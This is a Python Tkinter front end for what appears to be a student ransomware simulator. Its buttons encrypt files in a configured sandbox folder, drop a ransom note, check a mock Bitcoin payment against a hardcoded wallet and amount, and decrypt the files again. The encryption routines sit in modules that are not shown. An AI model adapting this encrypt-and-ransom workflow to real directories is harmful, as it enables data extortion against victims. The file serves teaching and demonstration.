# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
from PIL import Image, ImageTk

import crypto_engine
import file_manager
import config

class AplicacioHacker:
    #Configuracio inicial de la finestra (colors, mides...)
    def __init__(self, finestra):
        self.finestra = finestra
        self.finestra.title("TERMINAL DE CIBERSEGURETAT - ENTI UB")
        self.finestra.geometry("1000x600")
        self.finestra.resizable(False, False) 
        
        self.color_fons = "#000005"
        self.color_text = "#00FF00"
        self.color_boto = "#1a1a1a"
        
        self.finestra.configure(bg=self.color_fons)
        self.finestra.protocol("WM_DELETE_WINDOW", self.sortida_segura)
        
        self.txt_consola = None 
        self.pantalla = None
        self.pantalla_inici()

#Funció que restableix la finestra (s'executara sempre que es vulgui iniciar una funcionalitat amb una nova finestra)
    def netejar(self):
        if self.pantalla:
            self.pantalla.destroy()

#Primera pantalla que apareix al executar el programa (s'avança amb <space>)
    def pantalla_inici(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        if os.path.exists(config.FILE_LOGO):
            try:
                img_bruta = Image.open(config.FILE_LOGO)
                img_neta = img_bruta.resize((400, 280), Image.LANCZOS)
                self.logo_img = ImageTk.PhotoImage(img_neta)
                tk.Label(contingut, image=self.logo_img, bg=self.color_fons).pack(pady=10)
            except:
                pass

        tk.Label(contingut, text="GENERADOR DE RANSOMWARE", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 28, "bold")).pack(pady=10)
        tk.Label(contingut, text="MARC FERNANDEZ - MARTI OLIVER", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 16)).pack(pady=5)
        tk.Label(contingut, text="[ PREM ESPAI PER ACCEDIR ]", 
                 fg="#ffffff", bg=self.color_fons, font=("Consolas", 18)).pack(pady=40)

        self.finestra.bind("<space>", self.anar_a_menu)

#Funció que et porta al menu principal
    def anar_a_menu(self, event):
        self.finestra.unbind("<space>")
        self.pantalla_menu()

#Funció amb les 5 funcionalitats que ofereix el programa (botons)
    def pantalla_menu(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        opcions = [
            ("EXECUTAR INFECCIO", self.accions_infectar),
            ("SIMULAR PAGAMENT (BTC)", self.pantalla_pagament),
            ("RECUPERAR DADES", self.accions_recuperar),
            ("CONSULTAR LOGS", self.accions_historial),
            ("TANCAR TERMINAL", self.sortida_segura)
        ]

        for text, comanda in opcions:
            tk.Button(contingut, text=text, width=35, height=2,
                      bg=self.color_boto, fg=self.color_text, 
                      font=("Consolas", 12, "bold"), command=comanda).pack(pady=10)

#Pantalla on introduir els valors nº de compte i quantitat 
    def pantalla_pagament(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(contingut, text="SISTEMA DE PAGAMENT BTC", fg="#FF9900", bg=self.color_fons, font=("Consolas", 18, "bold")).pack(pady=15)
        tk.Label(contingut, text="Adreca Wallet:", fg=self.color_text, bg=self.color_fons).pack()
        self.ent_wallet = tk.Entry(contingut, width=45, bg="#1a1a1a", fg="white")
        self.ent_wallet.pack(pady=5)
        tk.Label(contingut, text="Quantitat BTC:", fg=self.color_text, bg=self.color_fons).pack()
        self.ent_btc = tk.Entry(contingut, width=20, bg="#1a1a1a", fg="white")
        self.ent_btc.pack(pady=5)
        tk.Button(contingut, text="[ VERIFICAR ]", bg=self.color_boto, fg=self.color_text, font=("Consolas", 12, "bold"), command=self.validar_pagament).pack(pady=20)
        tk.Button(contingut, text="[ CANCEL-LAR ]", bg="#330000", fg="white", command=self.pantalla_menu).pack()

#Funció que valida els valors necessaris (compte i quantitat) del pagament, i aixi obtenir la clau criptografica
    def validar_pagament(self):
        if self.ent_wallet.get() == "bc1qxy2kgdy6jrsqx7644vvv" and self.ent_btc.get() == "0.5":
            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
            messagebox.showinfo("EXIT", "Pagament confirmat. Clau restablerta.")
            file_manager.registrar_log("PAGAMENT_OK", "0.5 BTC")
            self.pantalla_menu()
        else:
            messagebox.showerror("ERROR", "Dades incorrectes.")

#Simulació d'una terminal on es mostraran accions (xifratge, logs, o altres)
    def crear_consola(self, titol):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        tk.Label(self.pantalla, text=f"> {titol}", fg=self.color_text, bg=self.color_fons, font=("Consolas", 14)).pack(pady=10)
        self.txt_consola = scrolledtext.ScrolledText(self.pantalla, width=110, height=25, bg="#050505", fg=self.color_text, font=("Consolas", 10), state="disabled")
        self.txt_consola.pack(pady=10, padx=20)
        tk.Button(self.pantalla, text="[ TORNAR ]", bg=self.color_boto, fg=self.color_text, command=self.pantalla_menu).pack(pady=5)

#Funció que escriurà text a la "terminal" creada 
    def afegir_a_consola(self, missatge):
        if self.txt_consola:
            self.txt_consola.config(state="normal") 
            self.txt_consola.insert(tk.END, missatge + "\n")
            self.txt_consola.see(tk.END)
            self.txt_consola.config(state="disabled") #important modificar l'estat de normal-disabled per a evitar que l'usuari sigui capaç d'escriure text a la terminal

#Funció que gestiona el xifratge d'arxius
    def accions_infectar(self):
        self.crear_consola("EXECUTANT INFECCIO...")
        try:
            target = os.path.abspath(config.SAND_DIR)
            fitxers = file_manager.llistar_fitxers(target)
            comptador = 0
            for f in fitxers:
                ruta_abs = os.path.abspath(f)
                nom = os.path.basename(f)
                if not f.endswith(".locked") and "INSTRUCCIONS" not in nom:
                    if crypto_engine.xifrar_arxiu(ruta_abs, crypto_engine.CLAU_MESTRA):
                        self.afegir_a_consola(f"BLOQUEJAT: {nom}")
                        file_manager.registrar_log("FITXER_XIFRAT", nom)
                        comptador += 1
                    else:
                        self.afegir_a_consola(f"ERROR: {nom}")
            file_manager.generar_nota_rescat(target)
            self.afegir_a_consola(f"\n--- PROCES FINALITZAT ({comptador} fitxers) ---")
        except Exception as e:
            self.afegir_a_consola(f"ERROR: {e}")

#Funció que gestiona el desxifratge d'arxius
    def accions_recuperar(self):
        if not os.path.exists(config.FILE_KEY):
            messagebox.showerror("ERROR", "Cal pagar el rescat primer.")
            return
        self.crear_consola("DESXIFRANT DADES...")
        try:
            clau = crypto_engine.carregar_clau(config.FILE_KEY)
            target = os.path.abspath(config.SAND_DIR)
            fitxers = file_manager.llistar_fitxers(target)
            comptador = 0
            for f in fitxers:
                if f.endswith(".locked"):
                    ruta_abs = os.path.abspath(f)
                    if crypto_engine.desxifrar_arxiu(ruta_abs, clau):
                        self.afegir_a_consola(f"RECUPERAT: {os.path.basename(f)}")
                        file_manager.registrar_log("FITXER_RECUPERAT", os.path.basename(f))
                        comptador += 1
                        self.finestra.update()
            self.afegir_a_consola(f"\n--- EXIT: {comptador} fitxers recuperats ---")
        except Exception as e:
            self.afegir_a_consola(f"ERROR: {e}")


#Funció que llegeix els logs del programa i els mostra per la GUI
    def accions_historial(self):
        self.crear_consola("LOGS DEL SISTEMA...")
        try:
            if os.path.exists(config.FILE_LOGS):
                with open(config.FILE_LOGS, "r", encoding="utf-8") as f:
                    linies = f.readlines()
                for linia in reversed(linies):
                    self.afegir_a_consola(f"> {linia.strip()}")
            else:
                self.afegir_a_consola("No hi ha historial.")
        except:
            self.afegir_a_consola("Error llegint logs.")

#Finestra emergent que es mostra al intentar tancar la finestra de la GUI
    def sortida_segura(self):
        if messagebox.askyesno("SORTIDA", "Vols tancar?"):
            self.finestra.quit()

#Només si l'arxiu s'executa directament
if __name__ == "__main__":
    root = tk.Tk()
    AplicacioHacker(root)
    root.mainloop()
